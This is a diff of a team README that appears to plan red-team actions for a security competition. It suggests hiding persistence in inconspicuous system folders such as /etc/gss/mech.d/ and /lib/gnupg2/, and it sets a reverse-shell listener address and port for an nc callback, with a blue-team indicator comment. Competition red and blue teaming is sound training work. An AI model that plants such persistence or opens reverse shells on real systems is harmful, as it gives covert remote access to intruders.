@@ -1,6 +1,6 @@
-# Hi Team
+# Hi Team PLEASE NO SPACES IN FOLDER NAMES
 
-This is the plan that I have for the deployment
+This is the plan that I have for the deployment 
 
 To get the multissh up and running you need to run ```./setup_env.sh``` as the root user (actually switch to the root user) and do ```multissh-activate``` to get the venv up and running.
 
@@ -14,9 +14,10 @@ restrictions may apply*
 Some possible directories:
 - Any folder in /etc/, especially the boring looking ones like gss/mech.d/
 - Any conf files they might not check
-- /bins/ or /bin/ or /usr/share/ 
-- /lib/ <--- This is where I will go
+- /bin/ or /usr/share/ 
 - some persistence will end up in /tmp/ as well but that's not too important
+- /lib/gnupg2/ <--- All of the initial scripts during deploy
+    - will rerun if access is still there
 
 Things to change before comp start:
 - Creds in CompPlacholder.yaml
@@ -37,7 +38,7 @@ Different versions of `nc` support different flags, so here are variants:
 # EDUCATIONAL - Competition use only
 # Blue team indicator: outbound connection on non-standard port, nc process
 
-LHOST="192.168.1.100"  # Replace with your red team listener IP
+LHOST="10.10.10.51"  # Replace with your red team listener IP
 LPORT="4444"
 
 echo "[RED TEAM] Spawning reverse shell to $LHOST:$LPORT" >> /tmp/redteam_actions.log
